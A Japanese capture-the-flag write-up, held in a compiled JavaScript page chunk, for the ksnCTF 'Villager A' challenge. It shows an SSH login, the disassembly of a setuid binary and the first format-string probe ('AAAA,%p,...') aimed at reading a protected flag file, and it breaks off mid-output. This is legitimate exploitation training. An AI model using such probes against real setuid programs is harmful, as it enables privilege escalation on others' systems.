(window.webpackJsonp=window.webpackJsonp||[]).push([[87],{360:function(t,s,a){"use strict";a.r(s);var e=a(12),n=Object(e.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"ksnctf-villager-a"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#ksnctf-villager-a"}},[t._v("#")]),t._v(" ksnCTF Villager A")]),t._v(" "),s("ul",[s("li",[t._v("sshで接続してみる")])]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("ssh")]),t._v(" -p "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10022")]),t._v(" q4@ctfq.sweetduet.info\nq4@ctfq.sweetduet.info's password: \nLast login: Wed Mar "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("13")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("13")]),t._v(":43:28 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2019")]),t._v(" from "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.0")]),t._v(".2.2\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("q4@localhost ~"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("$ "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("ls")]),t._v(" -l\ntotal "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),t._v("\n-r--------. "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" q4a  q4a    "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("22")]),t._v("  "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("5")]),t._v("月 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("22")]),t._v(" 02:12 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2012")]),t._v(" flag.txt\n-rwsr-xr-x. "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" q4a  q4a  "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("5857")]),t._v("  "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("5")]),t._v("月 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("22")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("11")]),t._v(":21 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2012")]),t._v(" q4\n-rw-r--r--. "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" root root  "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("151")]),t._v("  "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("6")]),t._v("月  "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" 04:47 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2012")]),t._v(" readme.txt\n")])])]),s("ul",[s("li",[t._v("flag.txtというファイルがあるので開きたい")])]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("q4@localhost ~"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("$ "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" flag.txt \ncat: flag.txt: Permission denied\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("q4@localhost ~"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("$ "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("chmod")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("755")]),t._v(" flag.txt \nchmod: changing permissions of `flag.txt': Operation not permitted\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("q4@localhost ~"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("$ "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("whoami")]),t._v("\nq4\n")])])]),s("ul",[s("li",[s("code",[t._v("permission denied")]),t._v("らしい")]),t._v(" "),s("li",[t._v("当然"),s("code",[t._v("chmod")]),t._v("も使えない")]),t._v(" "),s("li",[t._v("自分の名前は"),s("code",[t._v("q4")]),t._v("なので, "),s("code",[t._v("q4a")]),t._v("は使えない")]),t._v(" "),s("li",[t._v("q4というファイルのパーミッションは"),s("code",[t._v("-rwsr-xr-x")]),t._v("なので, "),s("code",[t._v("q4a")]),t._v("と異なるグループに属しているユーザでも実行はできそう")])]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("q4@localhost ~"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("$ ./q4\nWhat's your name?\nq4\nHi, q4\n\nDo you want the flag?\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("yes")]),t._v("\nDo you want the flag?\n"),s("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("true")]),t._v("\nDo you want the flag?\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("yes")]),t._v("\nDo you want the flag?\nno\nI see. Good bye.\n")])])]),s("ul",[s("li",[t._v("noを言うまで問うのをやめてくれない")]),t._v(" "),s("li",[s("code",[t._v("objdump")]),t._v("で確認する")])]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ objdump -d -M intel ./q4\n~~ 略 ~~~\n080485b4 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("main"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":\n 80485b4:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("55")]),t._v("                      push   ebp\n 80485b5:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("89")]),t._v(" e5                   mov    ebp,esp\n 80485b7:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("83")]),t._v(" e4 f0                and    esp,0xfffffff0\n 80485ba:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("81")]),t._v(" ec "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v(" 04 00 00       sub    esp,0x420\n 80485c0:       c7 04 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" a4 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("87")]),t._v(" 04 08    mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",0x80487a4\n 80485c7:       e8 f8 fe ff ff          call   80484c4 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("puts@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n 80485cc:       a1 04 9a 04 08          mov    eax,ds:0x8049a04\n 80485d1:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("89")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("44")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" 08             mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x8"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",eax\n 80485d5:       c7 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("44")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" 04 00 04 00    mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x4"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",0x400\n 80485dc:       00 \n 80485dd:       8d "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("44")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v("             lea    eax,"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x18"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n 80485e1:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("89")]),t._v(" 04 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v("                mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",eax\n 80485e4:       e8 9b fe ff ff          call   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048484")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("fgets@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n 80485e9:       c7 04 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" b6 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("87")]),t._v(" 04 08    mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",0x80487b6\n 80485f0:       e8 bf fe ff ff          call   80484b4 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("printf@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n 80485f5:       8d "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("44")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v("             lea    eax,"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x18"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n 80485f9:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("89")]),t._v(" 04 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v("                mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",eax\n 80485fc:       e8 b3 fe ff ff          call   80484b4 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("printf@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048601")]),t._v(":       c7 04 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" 0a 00 00 00    mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",0xa\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048608")]),t._v(":       e8 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("67")]),t._v(" fe ff ff          call   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048474")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("putchar@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n 804860d:       c7 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("84")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v(" 04 00 00    mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x418"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",0x1\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048614")]),t._v(":       01 00 00 00 \n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048618")]),t._v(":       eb "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("67")]),t._v("                   jmp    "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048681")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("main+0xcd"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n 804861a:       c7 04 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" bb "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("87")]),t._v(" 04 08    mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",0x80487bb\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048621")]),t._v(":       e8 9e fe ff ff          call   80484c4 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("puts@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048626")]),t._v(":       a1 04 9a 04 08          mov    eax,ds:0x8049a04\n 804862b:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("89")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("44")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" 08             mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x8"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",eax\n 804862f:       c7 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("44")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" 04 00 04 00    mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x4"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",0x400\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048636")]),t._v(":       00 \n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048637")]),t._v(":       8d "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("44")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v("             lea    eax,"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x18"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n 804863b:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("89")]),t._v(" 04 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v("                mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",eax\n 804863e:       e8 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("41")]),t._v(" fe ff ff          call   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048484")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("fgets@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048643")]),t._v(":       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("85")]),t._v(" c0                   "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("test")]),t._v("   eax,eax\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048645")]),t._v(":       0f "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("94")]),t._v(" c0                sete   al\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048648")]),t._v(":       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("84")]),t._v(" c0                   "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("test")]),t._v("   al,al\n 804864a:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("74")]),t._v(" 0a                   je     "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048656")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("main+0xa"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("2")]),t._v(">")]),t._v("\n 804864c:       b8 00 00 00 00          mov    eax,0x0\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048651")]),t._v(":       e9 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("86")]),t._v(" 00 00 00          jmp    80486dc "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("main+0x12"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("8")]),t._v(">")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048656")]),t._v(":       c7 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("44")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" 04 d1 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("87")]),t._v(" 04    mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x4"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",0x80487d1\n 804865d:       08 \n 804865e:       8d "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("44")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v("             lea    eax,"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x18"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048662")]),t._v(":       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("89")]),t._v(" 04 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v("                mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",eax\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048665")]),t._v(":       e8 7a fe ff ff          call   80484e4 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("strcmp@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n 804866a:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("85")]),t._v(" c0                   "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("test")]),t._v("   eax,eax\n 804866c:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("75")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("13")]),t._v("                   jne    "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048681")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("main+0xcd"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n 804866e:       c7 04 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" d5 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("87")]),t._v(" 04 08    mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",0x80487d5\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048675")]),t._v(":       e8 4a fe ff ff          call   80484c4 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("puts@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n 804867a:       b8 00 00 00 00          mov    eax,0x0\n 804867f:       eb 5b                   jmp    80486dc "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("main+0x12"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("8")]),t._v(">")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048681")]),t._v(":       8b "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("84")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v(" 04 00 00    mov    eax,DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x418"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048688")]),t._v(":       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("85")]),t._v(" c0                   "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("test")]),t._v("   eax,eax\n 804868a:       0f "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("95")]),t._v(" c0                setne  al\n 804868d:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("84")]),t._v(" c0                   "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("test")]),t._v("   al,al\n 804868f:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("75")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("89")]),t._v("                   jne    804861a "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("main+0x6"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("6")]),t._v(">")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048691")]),t._v(":       c7 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("44")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" 04 e6 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("87")]),t._v(" 04    mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x4"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",0x80487e6\n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048698")]),t._v(":       08 \n "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048699")]),t._v(":       c7 04 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" e8 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("87")]),t._v(" 04 08    mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",0x80487e8\n 80486a0:       e8 ff fd ff ff          call   80484a4 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("fopen@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n 80486a5:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("89")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("84")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" 1c 04 00 00    mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x41c"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",eax\n 80486ac:       8b "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("84")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" 1c 04 00 00    mov    eax,DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x41c"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n 80486b3:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("89")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("44")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" 08             mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x8"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",eax\n 80486b7:       c7 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("44")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" 04 00 04 00    mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x4"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",0x400\n 80486be:       00 \n 80486bf:       8d "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("44")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v("             lea    eax,"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x18"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n 80486c3:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("89")]),t._v(" 04 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v("                mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",eax\n 80486c6:       e8 b9 fd ff ff          call   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8048484")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("fgets@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n 80486cb:       8d "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("44")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v("             lea    eax,"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp+0x18"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n 80486cf:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("89")]),t._v(" 04 "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("24")]),t._v("                mov    DWORD PTR "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("esp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(",eax\n 80486d2:       e8 "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("dd")]),t._v(" fd ff ff          call   80484b4 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("printf@plt"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n 80486d7:       b8 00 00 00 00          mov    eax,0x0\n 80486dc:       c9                      leave  \n 80486dd:       c3                      ret    \n 80486de:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("90")]),t._v("                      nop\n 80486df:       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("90")]),t._v("                      nop\n~~ 略 ~~~\n\n")])])]),s("ul",[s("li",[t._v("出力より, 次のようにmainが実行されていることがわかる\n"),s("ul",[s("li",[t._v("puts")]),t._v(" "),s("li",[t._v("fgets")]),t._v(" "),s("li",[t._v("printf")]),t._v(" "),s("li",[t._v("printf")]),t._v(" "),s("li",[t._v("putchar")]),t._v(" "),s("li",[t._v("fopen")]),t._v(" "),s("li",[t._v("puts")])])]),t._v(" "),s("li",[t._v("fgetsを使用しているのでbofかformat stringを狙える気がする")])]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("q4@localhost ~"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("$ ./q4\nWhat"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'s your name?\nAAAAAAAAAAAAAAAAAAAAAa\nHi, AAAAAAAAAAAAAAAAAAAAAa\n\nDo you want the flag?\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nDo you want the flag?\n^C\n[q4@localhost ~]$ ./q4\nWhat'")]),t._v("s your name?\nAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p\nHi, 